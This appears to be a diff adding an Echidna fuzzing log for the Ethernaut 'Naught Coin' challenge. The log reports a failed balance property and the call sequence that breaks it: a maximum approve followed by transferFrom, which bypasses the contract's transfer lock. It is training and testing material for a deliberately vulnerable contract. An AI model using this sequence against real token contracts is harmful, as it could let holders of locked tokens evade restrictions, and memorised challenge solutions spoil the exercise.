@@ -1,0 +1,12 @@
+Analyzing contract: /code/ethernaut/15-Naught-Coin/Test.sol:Test
+echidna_test_player_balance: failed!💥  
+  Call sequence:
+    approve(0x10000,115792089237316195423570985008687907853269984665640564039457584007913129639935)
+    transferFrom(0x10000,0x797d738a28cd52bb25d32a15bbd3fb23eb64a7b3,2988816331)
+
+
+
+Unique instructions: 1347
+Unique codehashes: 1
+Corpus size: 2
+Seed: -3786201817565362428
